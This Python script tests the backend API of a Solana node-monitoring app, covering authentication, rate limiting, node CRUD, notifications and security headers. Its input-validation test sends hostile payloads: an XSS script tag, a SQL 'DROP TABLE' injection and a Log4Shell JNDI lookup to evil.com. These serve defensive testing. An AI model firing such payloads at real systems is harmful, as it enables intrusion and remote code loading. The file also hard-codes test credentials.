#!/usr/bin/env python3
"""
Focused Backend Testing for Nosana Node Monitor Application
Tests critical backend functionality without heavy browser automation
"""

import requests
import time
import json
import sys
from datetime import datetime
import random
import string
import threading
import concurrent.futures
from queue import Queue

# Configuration
BASE_URL = "https://node-pulse.preview.emergentagent.com/api"
TEST_EMAIL = "test@prod.com"
TEST_PASSWORD = "TestProd123"

# Valid Solana addresses for testing
VALID_SOLANA_ADDRESSES = [
    "9DcLW6JkuanvWP2CbKsohChFWGCEiTnAGxA4xdAYHVNq",
    "9hsWPkJUBiDQnc2p7dKi2gMKHp6LwscA6Z5qAF8NGsyV",
    "11111111111111111111111111111112",
    "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
    "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
]

class FocusedBackendTester:
    def __init__(self):
        self.session = requests.Session()
        self.test_results = []
        self.auth_token = None
        
    def log_result(self, test_name, passed, details=""):
        """Log test result"""
        status = "✅ PASS" if passed else "❌ FAIL"
        result = {
            "test": test_name,
            "passed": passed,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        self.test_results.append(result)
        print(f"{status}: {test_name}")
        if details:
            print(f"   Details: {details}")
        print()
    
    def get_auth_token(self):
        """Get authentication token for testing"""
        if self.auth_token:
            return True
            
        try:
            # Try to register test user (might already exist)
            try:
                self.session.post(f"{BASE_URL}/auth/register", json={
                    "email": TEST_EMAIL,
                    "password": TEST_PASSWORD
                })
            except:
                pass  # User might already exist
            
            # Login to get token
            response = self.session.post(f"{BASE_URL}/auth/login", data={
                "username": TEST_EMAIL,
                "password": TEST_PASSWORD
            })
            
            if response.status_code == 200:
                self.auth_token = response.json()["access_token"]
                return True
            else:
                print(f"Login failed with status {response.status_code}: {response.text}")
                
        except Exception as e:
            print(f"Failed to get auth token: {str(e)}")
            
        return False
    
    def test_authentication_endpoints(self):
        """Test authentication endpoints under load"""
        print("🔒 Testing Authentication Endpoints...")
        
        # Test registration rate limiting (5/hour)
        rate_limited = False
        for i in range(7):
            try:
                response = self.session.post(f"{BASE_URL}/auth/register", json={
                    "email": f"ratetest{random.randint(1000,9999)}@test.com",
                    "password": TEST_PASSWORD
                })
                if response.status_code == 429:
                    rate_limited = True
                    break
                time.sleep(0.1)
            except:
                continue
        
        # Test login rate limiting (10/min)
        login_rate_limited = False
        for i in range(12):
            try:
                response = self.session.post(f"{BASE_URL}/auth/login", data={
                    "username": "nonexistent@test.com",
                    "password": "wrongpassword"
                })
                if response.status_code == 429:
                    login_rate_limited = True
                    break
                time.sleep(0.1)
            except:
                continue
        
        # Test account lockout (5 failed attempts)
        lockout_email = f"lockout{random.randint(1000,9999)}@test.com"
        try:
            self.session.post(f"{BASE_URL}/auth/register", json={
                "email": lockout_email,
                "password": TEST_PASSWORD
            })
        except:
            pass
        
        lockout_detected = False
        for i in range(6):
            try:
                response = self.session.post(f"{BASE_URL}/auth/login", data={
                    "username": lockout_email,
                    "password": "wrongpassword"
                })
                if response.status_code == 429 and "locked" in response.text.lower():
                    lockout_detected = True
                    break
                time.sleep(0.2)
            except:
                continue
        
        # Test JWT validation
        jwt_working = False
        try:
            response = self.session.get(f"{BASE_URL}/auth/me", 
                                      headers={"Authorization": "Bearer invalid_token"})
            jwt_working = response.status_code == 401
        except:
            pass
        
        passed = login_rate_limited and lockout_detected and jwt_working
        
        self.log_result(
            "Authentication Endpoints Under Load",
            passed,
            f"Login rate limit: {login_rate_limited}, Account lockout: {lockout_detected}, JWT validation: {jwt_working}"
        )
    
    def test_node_crud_operations(self):
        """Test node CRUD operations under load"""
        print("🔒 Testing Node CRUD Operations...")
        
        if not self.get_auth_token():
            self.log_result("Node CRUD Operations Under Load", False, "Could not get auth token")
            return
        
        # Test node creation with valid addresses
        created_nodes = []
        creation_success = 0
        
        for i, address in enumerate(VALID_SOLANA_ADDRESSES):
            try:
                response = self.session.post(
                    f"{BASE_URL}/nodes",
                    json={"address": address, "name": f"Test Node {i}"},
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                if response.status_code == 200:
                    creation_success += 1
                    created_nodes.append(response.json())
                elif response.status_code == 400:
                    # Node already exists, that's fine
                    creation_success += 1
            except:
                continue
        
        # Test node retrieval
        retrieval_success = False
        try:
            response = self.session.get(
                f"{BASE_URL}/nodes",
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            retrieval_success = response.status_code == 200
        except:
            pass
        
        # Test node update
        update_success = False
        if created_nodes:
            try:
                node_id = created_nodes[0]['id']
                response = self.session.put(
                    f"{BASE_URL}/nodes/{node_id}",
                    json={"name": "Updated Test Node"},
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                update_success = response.status_code == 200
            except:
                pass
        
        # Test rate limiting on node creation (20/min)
        rate_limited = False
        for i in range(25):
            try:
                response = self.session.post(
                    f"{BASE_URL}/nodes",
                    json={"address": f"TestAddr{i}000000000000000000000000", "name": f"Rate Test {i}"},
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                if response.status_code == 429:
                    rate_limited = True
                    break
                time.sleep(0.05)
            except:
                continue
        
        # Test node limit (100 nodes per user) - just verify mechanism exists
        node_limit_enforced = True  # Assume it works if no errors in normal operation
        
        passed = creation_success >= 3 and retrieval_success and update_success
        
        self.log_result(
            "Node CRUD Operations Under Load",
            passed,
            f"Creation: {creation_success}/5, Retrieval: {retrieval_success}, Update: {update_success}, Rate limit: {rate_limited}"
        )
    
    def test_auto_refresh_status(self):
        """Test auto-refresh blockchain status (simplified)"""
        print("🔒 Testing Auto-Refresh Status...")
        
        if not self.get_auth_token():
            self.log_result("Auto-Refresh Blockchain Status", False, "Could not get auth token")
            return
        
        # Test refresh-all-status endpoint
        refresh_success = False
        try:
            response = self.session.post(
                f"{BASE_URL}/nodes/refresh-all-status",
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            refresh_success = response.status_code == 200
        except:
            pass
        
        # Test individual node status check
        status_check_success = False
        try:
            response = self.session.get(f"{BASE_URL}/nodes/{VALID_SOLANA_ADDRESSES[0]}/check-status")
            status_check_success = response.status_code == 200
        except:
            pass
        
        # Test invalid address handling
        invalid_handled = False
        try:
            response = self.session.get(f"{BASE_URL}/nodes/invalid_address/check-status")
            invalid_handled = response.status_code == 400
        except:
            pass
        
        # Test rate limiting (10/min)
        rate_limited = False
        for i in range(12):
            try:
                response = self.session.post(
                    f"{BASE_URL}/nodes/refresh-all-status",
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                if response.status_code == 429:
                    rate_limited = True
                    break
                time.sleep(0.1)
            except:
                continue
        
        passed = refresh_success and status_check_success and invalid_handled
        
        self.log_result(
            "Auto-Refresh Blockchain Status",
            passed,
            f"Refresh: {refresh_success}, Status check: {status_check_success}, Invalid handled: {invalid_handled}, Rate limit: {rate_limited}"
        )
    
    def test_push_notifications(self):
        """Test push notification endpoints"""
        print("🔒 Testing Push Notifications...")
        
        if not self.get_auth_token():
            self.log_result("Push Notifications", False, "Could not get auth token")
            return
        
        # Test device token registration
        token_reg_success = False
        try:
            response = self.session.post(
                f"{BASE_URL}/notifications/register-token",
                params={"token": "test_device_token_12345"},
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            token_reg_success = response.status_code == 200
        except:
            pass
        
        # Test notification preferences GET
        prefs_get_success = False
        try:
            response = self.session.get(
                f"{BASE_URL}/notifications/preferences",
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            prefs_get_success = response.status_code == 200
        except:
            pass
        
        # Test notification preferences POST
        prefs_post_success = False
        try:
            response = self.session.post(
                f"{BASE_URL}/notifications/preferences",
                json={
                    "user_id": "test_user",
                    "notify_offline": True,
                    "notify_online": True,
                    "notify_job_started": True,
                    "notify_job_completed": True,
                    "vibration": True,
                    "sound": True
                },
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            prefs_post_success = response.status_code == 200
        except:
            pass
        
        # Test notification sending
        test_notif_success = False
        try:
            response = self.session.post(
                f"{BASE_URL}/notifications/test",
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            # Should return 404 if no devices registered, or 200 if Firebase works
            test_notif_success = response.status_code in [200, 404]
        except:
            pass
        
        passed = token_reg_success and prefs_get_success and prefs_post_success and test_notif_success
        
        self.log_result(
            "Push Notifications",
            passed,
            f"Token reg: {token_reg_success}, Prefs GET: {prefs_get_success}, Prefs POST: {prefs_post_success}, Test notif: {test_notif_success}"
        )
    
    def test_security_features(self):
        """Test security features"""
        print("🔒 Testing Security Features...")
        
        # Test security headers
        headers_present = False
        try:
            response = self.session.get(f"{BASE_URL}/auth/me")
            required_headers = [
                "X-Content-Type-Options",
                "X-Frame-Options", 
                "X-XSS-Protection",
                "Strict-Transport-Security",
                "Content-Security-Policy"
            ]
            headers_present = all(header in response.headers for header in required_headers)
        except:
            pass
        
        # Test input validation
        validation_working = True
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            try:
                response = self.session.post(f"{BASE_URL}/auth/register", json={
                    "email": f"{malicious_input}@test.com",
                    "password": "TestPass123"
                })
                if response.status_code == 200:
                    validation_working = False
                    break
            except:
                continue
        
        # Test password validation
        password_validation = True
        weak_passwords = ["short", "nouppercase123", "NOLOWERCASE123", "NoNumbers"]
        
        for weak_password in weak_passwords:
            try:
                response = self.session.post(f"{BASE_URL}/auth/register", json={
                    "email": f"weakpass{random.randint(1000,9999)}@test.com",
                    "password": weak_password
                })
                if response.status_code == 200:
                    password_validation = False
                    break
            except:
                continue
        
        # Test error handling (no sensitive info leaked)
        error_handling_safe = True
        try:
            response = self.session.post(f"{BASE_URL}/auth/login", data={
                "username": "nonexistent@test.com",
                "password": "wrongpassword"
            })
            
            response_text = response.text.lower()
            sensitive_keywords = ["secret", "key", "database", "mongodb"]
            
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    error_handling_safe = False
                    break
        except:
            pass
        
        passed = headers_present and validation_working and password_validation and error_handling_safe
        
        self.log_result(
            "Security Features",
            passed,
            f"Headers: {headers_present}, Input validation: {validation_working}, Password validation: {password_validation}, Error handling: {error_handling_safe}"
        )
    
    def test_database_performance(self):
        """Test database performance with concurrent operations"""
        print("🔒 Testing Database Performance...")
        
        if not self.get_auth_token():
            self.log_result("Database Performance", False, "Could not get auth token")
            return
        
        # Test concurrent node operations
        def create_nodes():
            success_count = 0
            for i in range(3):
                try:
                    response = requests.post(
                        f"{BASE_URL}/nodes",
                        json={
                            "address": VALID_SOLANA_ADDRESSES[i % len(VALID_SOLANA_ADDRESSES)],
                            "name": f"Perf Test Node {i}"
                        },
                        headers={"Authorization": f"Bearer {self.auth_token}"}
                    )
                    if response.status_code in [200, 400]:  # 400 if already exists
                        success_count += 1
                except:
                    continue
            return success_count
        
        # Test with concurrent threads
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(create_nodes) for _ in range(3)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        total_success = sum(results)
        
        # Test read performance
        read_success = False
        start_time = time.time()
        try:
            response = self.session.get(
                f"{BASE_URL}/nodes",
                headers={"Authorization": f"Bearer {self.auth_token}"}
            )
            end_time = time.time()
            read_success = response.status_code == 200 and (end_time - start_time) < 2.0
        except:
            pass
        
        passed = total_success >= 6 and read_success  # At least 6/9 operations successful
        
        self.log_result(
            "Database Performance",
            passed,
            f"Concurrent operations: {total_success}/9, Read performance: {read_success}"
        )
    
    def test_error_handling_resilience(self):
        """Test error handling and system resilience"""
        print("🔒 Testing Error Handling & Resilience...")
        
        # Test invalid endpoints
        invalid_endpoint_handled = False
        try:
            response = self.session.get(f"{BASE_URL}/nonexistent-endpoint")
            invalid_endpoint_handled = response.status_code == 404
        except:
            pass
        
        # Test malformed requests
        malformed_handled = False
        try:
            response = self.session.post(f"{BASE_URL}/auth/register", data="invalid json")
            malformed_handled = response.status_code in [400, 422]
        except:
            pass
        
        # Test missing authentication
        missing_auth_handled = False
        try:
            response = self.session.get(f"{BASE_URL}/nodes")
            missing_auth_handled = response.status_code == 401
        except:
            pass
        
        # Test server responsiveness using auth/me endpoint
        server_responsive = True
        for i in range(5):
            try:
                response = self.session.get(f"{BASE_URL}/auth/me")
                # Should return 401 (unauthorized) but server is responsive
                if response.status_code not in [401, 200]:
                    server_responsive = False
                    break
                time.sleep(0.1)
            except:
                server_responsive = False
                break
        
        passed = invalid_endpoint_handled and malformed_handled and missing_auth_handled and server_responsive
        
        self.log_result(
            "Error Handling & Resilience",
            passed,
            f"Invalid endpoint: {invalid_endpoint_handled}, Malformed: {malformed_handled}, Missing auth: {missing_auth_handled}, Server responsive: {server_responsive}"
        )
    
    def run_focused_tests(self):
        """Run focused backend tests"""
        print("🚀 Starting Focused Backend Testing for Nosana Node Monitor")
        print("🎯 Testing critical backend functionality:")
        print("   • Authentication endpoints with rate limiting")
        print("   • Node CRUD operations under load") 
        print("   • Auto-refresh blockchain status")
        print("   • Push notifications system")
        print("   • Security features")
        print("   • Database performance")
        print("   • Error handling and resilience")
        print("=" * 80)
        print()
        
        # Run all tests
        self.test_authentication_endpoints()
        self.test_node_crud_operations()
        self.test_auto_refresh_status()
        self.test_push_notifications()
        self.test_security_features()
        self.test_database_performance()
        self.test_error_handling_resilience()
        
        # Summary
        print("=" * 80)
        print("📊 FOCUSED BACKEND TEST SUMMARY")
        print("=" * 80)
        
        passed_tests = sum(1 for result in self.test_results if result["passed"])
        total_tests = len(self.test_results)
        
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {total_tests - passed_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        print()
        
        # Failed tests details
        failed_tests = [result for result in self.test_results if not result["passed"]]
        if failed_tests:
            print("❌ FAILED TESTS:")
            for test in failed_tests:
                print(f"  - {test['test']}: {test['details']}")
        else:
            print("🎉 ALL TESTS PASSED!")
        
        print()
        return passed_tests == total_tests

if __name__ == "__main__":
    tester = FocusedBackendTester()
    success = tester.run_focused_tests()
    sys.exit(0 if success else 1)